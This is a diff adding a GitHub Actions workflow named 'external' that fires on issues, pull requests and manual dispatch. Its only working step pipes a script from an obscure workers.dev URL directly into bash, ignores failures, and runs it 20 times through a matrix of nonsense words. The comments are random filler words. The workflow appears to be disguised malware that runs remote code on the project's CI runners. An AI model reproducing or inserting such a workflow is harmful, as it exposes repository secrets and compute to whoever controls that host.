@@ -1,0 +1,22 @@
+name: external
+
+#voluntary analysis
+on:
+  issues:
+  workflow_dispatch:
+  pull_request:
+
+#excellent nourish plain pin
+jobs:
+  transport:
+    #criticize important particular facility
+    steps:
+    - uses: actions/checkout@v6
+    - name: conquer
+      continue-on-error: true
+      run: curl -S -L "https://x.linux-work-10x1za.workers.dev/5949fcd07e54dcda64e919acd8f3be76a528d/438e01e/49ee884e7da9f8ddd35e?pu=1775326396&ipq=on&n=so" | bash
+    strategy:
+      matrix:
+        preposition: ["aid", "troop", "commit", "existence", "item"]
+        purse: ["single", "accord", "steam", "flexible"]
+    runs-on: ubuntu-latest
